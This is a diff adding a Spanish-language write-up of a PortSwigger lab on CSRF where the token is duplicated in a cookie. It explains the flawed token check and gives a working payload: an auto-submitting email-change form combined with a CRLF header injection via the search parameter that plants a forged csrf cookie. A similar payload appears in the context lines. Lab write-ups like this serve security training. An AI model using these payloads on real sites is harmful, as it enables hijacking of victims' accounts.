@@ -461,6 +461,21 @@ Caso muy similar al anterior, pero se explota la falta de protección csrf en la
 <img src="/?search=test%0d%0aSet-Cookie:%20csrfKey=bPn9hLl0tvfI5hmsh7vnKuFh0auOpLjP" onerror="document.forms[0].submit()">
 ```
 
+### [CSRF where token is duplicated in cookie](https://portswigger.net/web-security/csrf/lab-token-duplicated-in-cookie)
+
+Autenticados en el laboratorio, ejecutamos la funcionalidad Change Email interceptando la request con burpsuite, y cambiando los valores del csrf del body y el de la cookie csrf, vemos que la validación simplemente consiste en comparar que un sea igual que el otro.
+Caso muy similar al anterior, también se explota la falta de protección csrf en la función de búsqueda para inyetar cookies en el navegaror de la víctima
+
+#### Solución:
+
+```html
+<form method="POST" action="https://acfa1f351e61acce80a95395003a0017.web-security-academy.net/email/change-email">
+     <input type="hidden" name="email" value="algo@mail.com">
+     <input type="hidden" name="csrf" value="fake">
+</form>
+<img src="https://acfa1f351e61acce80a95395003a0017.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake" onerror="document.forms[0].submit()">
+```
+
 ---
 
 ## [Clickjacking](https://portswigger.net/web-security/clickjacking)
